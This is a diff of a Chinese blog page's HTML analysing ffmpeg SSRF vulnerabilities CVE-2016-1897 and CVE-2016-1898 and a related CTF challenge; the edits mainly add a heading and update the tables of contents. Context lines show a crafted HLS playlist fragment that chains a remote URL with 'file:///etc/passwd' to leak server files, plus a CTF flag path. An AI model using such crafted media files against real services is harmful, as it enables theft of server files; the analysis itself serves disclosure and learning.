@@ -25,7 +25,7 @@
 漏洞影响如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件">
 <meta property="og:image" content="http://xdxd.love/images/ffmpegssrf1.png">
 <meta property="og:image" content="http://xdxd.love/images/ffmpegssrf2.png">
-<meta property="og:updated_time" content="2016-01-19T08:31:25.000Z">
+<meta property="og:updated_time" content="2016-01-19T08:35:57.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ffmpeg SSRF漏洞分析">
 <meta name="twitter:description" content="漏洞预警这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的这个文章，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自solidot15日的这个简短报道。
@@ -107,7 +107,7 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞预警"><span class="toc-number">1.</span> <span class="toc-text">漏洞预警</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞影响"><span class="toc-number">2.</span> <span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1897"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2016-1897</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">4.</span> <span class="toc-text">CTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞预警"><span class="toc-number">1.</span> <span class="toc-text">漏洞预警</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞影响"><span class="toc-number">2.</span> <span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1897"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2016-1897</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1898"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2016-1898</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">4.</span> <span class="toc-text">CTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
 		
 		</div>
 		
@@ -122,8 +122,7 @@
 <span class="preprocessor">#EXTINF:10.0,</span>
 concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
 <span class="preprocessor">#EXT-X-ENDLIST</span>
-</code></pre><p>CVE-2016-1898</p>
-<p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
+</code></pre><h2 id="CVE-2016-1898">CVE-2016-1898</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
 <pre><code><span class="comment">#EXTM3U</span>
 <span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
 <span class="comment">#EXTINF:10.0,</span>
@@ -205,7 +204,7 @@ file:<span class="comment">///home/ctf/flag.txt</span>
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞预警"><span class="toc-number">1.</span> <span class="toc-text">漏洞预警</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞影响"><span class="toc-number">2.</span> <span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1897"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2016-1897</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">4.</span> <span class="toc-text">CTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞预警"><span class="toc-number">1.</span> <span class="toc-text">漏洞预警</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞影响"><span class="toc-number">2.</span> <span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1897"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2016-1897</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1898"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2016-1898</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">4.</span> <span class="toc-text">CTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
  
   </div>
 
